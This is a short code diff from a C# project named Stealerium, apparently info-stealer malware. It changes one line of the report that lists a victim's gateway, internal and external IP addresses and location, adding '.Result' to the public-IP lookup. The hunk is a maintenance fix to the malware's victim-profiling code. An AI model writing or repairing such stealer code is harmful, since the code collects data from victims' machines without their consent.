@@ -193,7 +193,7 @@ namespace Stealerium
                        + "\n📡 *Network:* "
                        + "\nGateway IP: " + SystemInfo.GetDefaultGateway()
                        + "\nInternal IP: " + SystemInfo.GetLocalIp()
-                       + "\nExternal IP: " + SystemInfo.GetPublicIp()
+                       + "\nExternal IP: " + SystemInfo.GetPublicIp().Result
                        + "\n" + SystemInfo.GetLocation()
                        + "\n"
                        + "\n💸 *Domains info:*"
